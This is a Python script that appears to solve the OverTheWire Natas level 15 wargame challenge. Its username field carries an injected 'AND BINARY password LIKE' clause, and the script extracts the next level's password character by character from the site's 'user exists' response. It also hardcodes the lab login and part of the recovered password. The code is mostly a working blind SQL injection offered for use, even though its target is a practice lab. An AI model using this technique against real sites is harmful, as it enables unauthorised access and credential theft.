from pwn import *
import requests
import re
from string import *


username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = "http://{}.natas.labs.overthewire.org".format(username)
characters = ascii_lowercase + ascii_uppercase + digits

log.progress("Getting the natas16 password, Hold on! ")
session = requests.session()

seen_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nh"		# if you want from beginning make this string empty
while True:
    for ch in characters:
        #print("Trying with the character " + seen_password + "\t" + ch)
        web = session.post(url , data = {"username" : 'natas16" AND BINARY password LIKE "' + seen_password + ch + "%"}, auth = (username, password)).text
        if "user exists" in web:
            seen_password += ch
            break
    if len(seen_password) == 32:
        break
print("The password for natas16 is === " + seen_password)

